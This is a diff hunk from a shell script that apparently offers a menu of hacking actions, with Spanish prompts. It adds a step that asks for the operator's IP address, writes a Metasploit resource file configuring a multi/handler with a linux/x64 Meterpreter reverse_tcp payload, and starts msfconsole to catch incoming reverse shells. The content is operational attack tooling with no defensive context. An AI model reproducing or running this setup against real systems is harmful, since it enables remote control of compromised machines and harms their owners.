@@ -130,6 +130,12 @@ do
 	;;
 
 	9)
+	read -p "Dime tu dirección IP: " ip
+	echo "use exploit/multi/handler" > exploit.rc
+	echo "set PAYLOAD linux/x64/meterpreter/reverse_tcp" >> exploit.rc
+	echo "set LHOST $ip" >> exploit.rc
+	echo "run" >> exploit.rc
+
 	msfconsole -q -r exploit.rc
 	;;
 	10)
